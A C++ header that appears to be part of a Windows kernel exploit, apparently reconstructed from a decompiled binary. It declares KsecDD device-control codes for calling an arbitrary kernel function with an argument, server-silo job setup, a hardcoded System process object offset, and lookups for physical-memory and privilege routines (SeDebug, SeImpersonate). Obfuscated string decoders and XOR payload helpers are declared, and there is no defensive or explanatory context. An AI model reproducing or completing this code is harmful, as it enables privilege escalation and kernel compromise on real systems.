#pragma once

#include <array>
#include <cstddef>
#include <cstdint>
#include <functional>
#include <span>
#include <stdexcept>
#include <string>
#include <string_view>
#include <vector>

namespace makima::kernel::silo {

using NativeHandle = std::uintptr_t;

constexpr std::uint32_t ksecdd_register_lsa_ioctl = 0x398000;
constexpr std::uint32_t ksecdd_set_function_return_ioctl = 0x39006F;

struct NativeStatus final {
    std::int32_t value{};
    [[nodiscard]] bool success() const noexcept { return value >= 0; }
};

struct DeviceControlResult final {
    NativeStatus status{};
    std::vector<std::byte> output;
};



struct SystemProcessObjectCache final {
    std::array<std::byte, 0x1140> unknown_prefix_to_cached_object{};
    void* cached_system_process_object{};
};

static_assert(offsetof(SystemProcessObjectCache, cached_system_process_object) ==
              0x1140);

[[nodiscard]] void* resolve_system_process_object(
    SystemProcessObjectCache* context);

struct NativeApi final {
    NativeApi();

    std::function<NativeHandle(std::wstring_view, std::uint32_t)> open_object;
    std::function<NativeStatus(NativeHandle)> signal_event;
    std::function<NativeHandle(std::wstring_view)> open_device;
    std::function<DeviceControlResult(
        NativeHandle,
        std::uint32_t,
        std::span<const std::byte>,
        std::size_t)> device_control;
    std::function<NativeHandle()> create_job;
    std::function<NativeStatus(NativeHandle)> configure_silo_job;
    std::function<NativeStatus(NativeHandle, NativeHandle)> assign_process_to_job;
    std::function<NativeHandle(NativeHandle)> create_process_in_job;
    std::function<std::vector<std::byte>(NativeHandle, std::uint32_t)> query_job;
    std::function<NativeHandle(std::wstring_view)> open_directory;
    std::function<NativeHandle(NativeHandle, std::wstring_view)> create_directory;
    std::function<void(NativeHandle)> close;
};

struct SiloRecord final {
    std::uint64_t key{};
    std::uint64_t value{};
    std::uint32_t flags{};
    std::vector<std::byte> payload;
    [[nodiscard]] bool active() const noexcept { return (flags & 1U) != 0; }
};

struct SiloBuffer final {
    std::uintptr_t source_va{};
    std::vector<std::byte> bytes;
    void secure_release() noexcept;
};

struct SiloContext final {
    NativeHandle process{};
    NativeHandle job{};
    NativeHandle namespace_root{};
    NativeHandle ksecdd{};
    bool lsa_registered{};
    std::wstring namespace_name;
    std::vector<SiloBuffer> buffers;
    std::vector<SiloRecord> records;
};

struct KsecFunctionReturnRequest final {
    std::uint64_t kernel_function{};
    std::uint64_t argument{};
};
static_assert(sizeof(KsecFunctionReturnRequest) == 16);

[[nodiscard]] NativeApi make_native_api();

void abort_context_initialization() noexcept;
void abort_handle_initialization() noexcept;
void abort_process_initialization() noexcept;
void abort_job_initialization() noexcept;
void abort_namespace_initialization() noexcept;
void abort_device_initialization() noexcept;
void abort_record_initialization() noexcept;
void abort_buffer_initialization() noexcept;
void abort_query_initialization() noexcept;
void abort_attribute_initialization() noexcept;
void abort_process_parameters_initialization() noexcept;
void abort_create_info_initialization() noexcept;
void abort_query_cache_initialization() noexcept;
void abort_security_cache_initialization() noexcept;
void abort_job_information_initialization() noexcept;
void abort_namespace_path_initialization() noexcept;
void abort_ksec_request_initialization() noexcept;
void abort_ksec_output_initialization() noexcept;
void abort_lsa_registration_initialization() noexcept;
void abort_silo_teardown_initialization() noexcept;

[[nodiscard]] std::uint64_t mix_silo_cookie(
    std::uint64_t cookie,
    std::uint64_t salt) noexcept;
[[nodiscard]] std::uint64_t derive_silo_dispatch_key(
    std::uint64_t dispatch_state,
    std::uint64_t salt) noexcept;
[[nodiscard]] std::uint64_t fold_silo_record_key(
    std::uint64_t record_key,
    std::uint64_t record_value) noexcept;
[[nodiscard]] std::uint64_t scramble_silo_nonce(
    std::uint64_t nonce,
    std::uint64_t sequence) noexcept;
[[nodiscard]] std::uint64_t derive_ksec_request_tag(
    std::uint64_t kernel_function,
    std::uint64_t argument) noexcept;
[[nodiscard]] SiloBuffer& cached_query_buffer(SiloContext& context);
[[nodiscard]] SiloBuffer& cached_security_buffer(SiloContext& context);
[[nodiscard]] wchar_t* cached_se_debug_privilege_name();
[[nodiscard]] wchar_t* cached_se_impersonate_privilege_name();
[[nodiscard]] std::uint64_t hash_silo_payload(
    std::span<const std::byte> payload,
    std::uint64_t seed) noexcept;
[[noreturn]] void throw_native_api_unavailable();
[[noreturn]] void throw_invalid_silo_state();
[[noreturn]] void throw_buffer_bounds_error();

[[nodiscard]] SiloBuffer allocate_process_attributes(std::span<const std::byte>);
[[nodiscard]] wchar_t* decode_protected_utf16_140770140(
    const std::uint16_t* source);
[[nodiscard]] wchar_t* decode_protected_utf16_140771700(
    std::int64_t source);
[[nodiscard]] wchar_t* decode_protected_utf16_140774380(
    const std::uint16_t* source);
[[nodiscard]] std::byte* decode_protected_bytes_140776a60(
    const std::byte* source);
[[nodiscard]] std::byte* decode_protected_bytes_140778380(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_140779fc0(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_14077ca00(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_14077f600(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_140782bc0(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_140784ba0(
    const std::byte* source);
[[nodiscard]] std::byte* decode_protected_bytes_140787e00(
    const std::byte* source);
[[nodiscard]] std::byte* decode_protected_bytes_14078ac80(
    std::int64_t source);
[[nodiscard]] std::byte* decode_protected_bytes_14078d7a0(
    std::int64_t source);
[[nodiscard]] SiloBuffer allocate_command_line(std::span<const std::byte>);
[[nodiscard]] wchar_t* allocate_silo_wide_string_format(
    const std::uint16_t* protected_source);
[[nodiscard]] wchar_t* allocate_silo_device_directory_name(
    const std::uint16_t* protected_source);
[[nodiscard]] wchar_t* allocate_silo_device_child_path_format(
    const std::uint16_t* protected_source);
[[nodiscard]] char* allocate_nt_allocate_virtual_memory_ex_export_name(
    const std::byte* protected_source);
[[nodiscard]] wchar_t* allocate_silo_ntdll_module_name(
    const std::uint16_t* protected_source);
[[nodiscard]] wchar_t* allocate_silo_ntoskrnl_image_name(
    const std::uint16_t* protected_source);
[[nodiscard]] char* allocate_mm_get_virtual_for_physical_export_name(
    const std::byte* protected_source);
[[nodiscard]] SiloBuffer allocate_ksec_output(std::span<const std::byte>);
[[nodiscard]] SiloBuffer allocate_query_buffer(std::span<const std::byte>);
[[nodiscard]] wchar_t* allocate_silo_se_debug_privilege(
    const std::uint16_t* protected_source);
[[nodiscard]] wchar_t* allocate_silo_se_impersonate_privilege(
    const std::uint16_t* protected_source);


[[nodiscard]] wchar_t* allocate_lsa_authentication_initialized_event_name(
    const std::uint16_t* protected_source);
[[nodiscard]] wchar_t* allocate_ksecdd_device_path(
    const std::uint16_t* protected_source);

void release_process_attributes(SiloBuffer&) noexcept;
void release_thread_attributes(SiloBuffer&) noexcept;
void release_job_information(SiloBuffer&) noexcept;
void release_silo_information(SiloBuffer&) noexcept;
void release_security_storage(SiloBuffer&) noexcept;
void release_query_storage(SiloBuffer&) noexcept;
void release_namespace_storage(SiloBuffer&) noexcept;

[[nodiscard]] SiloRecord make_silo_record(
    std::span<const std::byte> payload,
    std::uint64_t record_key);
[[nodiscard]] SiloRecord make_tagged_silo_record(
    std::span<const std::byte> payload,
    std::uint64_t record_key);
void xor_silo_payload(
    std::span<std::byte> payload,
    std::uint64_t xor_key) noexcept;
[[nodiscard]] std::wstring utf16_text_from_little_endian_bytes(
    std::span<const std::byte>);
[[nodiscard]] bool record_payload_equals(
    const SiloRecord&,
    std::span<const std::byte>) noexcept;

[[nodiscard]] std::vector<std::uint64_t> collect_active_record_keys(
    std::span<const SiloRecord> records);
void sort_records_by_key(std::vector<SiloRecord>& records);
[[nodiscard]] const SiloRecord* find_record(
    std::span<const SiloRecord> records,
    std::uint64_t key) noexcept;
[[nodiscard]] std::uint64_t checksum_active_records(
    std::span<const SiloRecord> records) noexcept;
[[nodiscard]] std::vector<SiloRecord> merge_records(
    std::span<const SiloRecord> base_records,
    std::span<const SiloRecord> replacement_records);
[[nodiscard]] std::vector<SiloRecord> copy_active_records(
    std::span<const SiloRecord> records);
void append_unique_records(
    std::vector<SiloRecord>& destination,
    std::span<const SiloRecord> source);

[[nodiscard]] NativeHandle create_process_in_silo(
    SiloContext&,
    NativeApi&);
[[nodiscard]] bool create_and_assign_silo_job(SiloContext&, NativeApi&);
[[nodiscard]] bool create_device_directory_child(
    const void* reserved_context,
    const wchar_t* directory_prefix) noexcept;
[[nodiscard]] bool query_silo_information(
    NativeApi&,
    NativeHandle job,
    std::wstring& text);
[[nodiscard]] std::uint64_t read_object_field(
    std::span<const std::byte> object_bytes,
    std::size_t offset,
    std::size_t width,
    bool sign_extend);

[[noreturn]] void throw_invalid_string_view_position();
[[noreturn]] void throw_vector_too_long();
void copy_aligned_kernel_text(
    std::span<std::byte, 16> destination,
    std::span<const std::byte, 16> source) noexcept;

[[nodiscard]] bool register_ksecdd_silo_lsa(SiloContext&, NativeApi&);
[[nodiscard]] DeviceControlResult set_ksecdd_function_return(
    SiloContext&,
    NativeApi&,
    std::uint64_t kernel_function,
    std::uint64_t argument);
}
